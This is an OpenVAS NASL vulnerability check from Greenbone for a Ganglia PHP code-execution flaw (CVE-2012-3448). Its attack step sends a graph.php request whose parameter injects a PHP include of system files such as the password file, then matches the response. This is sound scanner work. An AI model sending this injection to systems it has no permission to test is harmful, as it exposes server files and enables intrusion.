###############################################################################
# OpenVAS Vulnerability Test
#
# Ganglia PHP Code Execution Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (C) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:ganglia:ganglia-web";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103535");
  script_bugtraq_id(54699);
  script_cve_id("CVE-2012-3448");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_version("2020-10-20T15:03:35+0000");
  script_name("Ganglia PHP Code Execution Vulnerability");
  script_tag(name:"last_modification", value:"2020-10-20 15:03:35 +0000 (Tue, 20 Oct 2020)");
  script_tag(name:"creation_date", value:"2012-08-13 12:40:50 +0200 (Mon, 13 Aug 2012)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_dependencies("gb_ganglia_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("ganglia/installed");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/54699");
  script_xref(name:"URL", value:"http://console-cowboys.blogspot.de/2012/07/extending-your-ganglia-install-with.html");

  script_tag(name:"summary", value:"Ganglia is prone to a vulnerability that lets remote attackers execute
  arbitrary code.");

  script_tag(name:"impact", value:"Attackers can exploit this issue to execute arbitrary PHP code within
  the context of the affected web server process.");

  script_tag(name:"solution", value:"Vendor updates are available. Please see the references for more
  information.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if(!port = get_app_port(cpe:CPE))exit(0);
if(!dir = get_app_location(cpe:CPE, port:port))exit(0);
if(dir == "/") dir = "";

files = traversal_files();

foreach pattern(keys(files)) {

  file = files[pattern];

  url = dir + '/graph.php?g=cpu_report,include+%27/' + file + '%27';

  if(http_vuln_check(port:port, url:url, pattern:pattern)) {
    report = http_report_vuln_url(port:port, url:url);
    security_message(data:report, port:port);
    exit(0);
  }
}

exit(99);
